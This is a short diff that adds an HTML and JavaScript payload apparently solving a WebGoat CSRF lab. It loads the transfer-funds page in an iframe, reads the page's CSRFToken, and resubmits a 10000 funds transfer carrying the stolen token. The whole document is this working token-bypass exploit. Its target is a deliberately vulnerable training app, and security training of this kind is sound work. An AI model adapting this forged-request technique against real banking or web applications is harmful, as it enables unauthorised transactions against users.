@@ -1,0 +1,14 @@
+
+<script>	
+	document.getElementById("myIframe").onload = function(){
+		if(this.src == "http://localhost:8090/WebGoat/attack?Screen=276&menu=900&transferFunds=main")
+		{
+			var token = this.contentWindow.document.getElementsByName("CSRFToken")[0].value;
+			alert(token);
+			this.src = "http://localhost:8090/WebGoat/attack?Screen=276&menu=900&transferFunds=10000&CSRFToken="+token;
+		}
+	}
+</script>
+
+
+<iframe id = "myIframe" src="http://localhost:8090/WebGoat/attack?Screen=276&menu=900&transferFunds=main"></iframe>
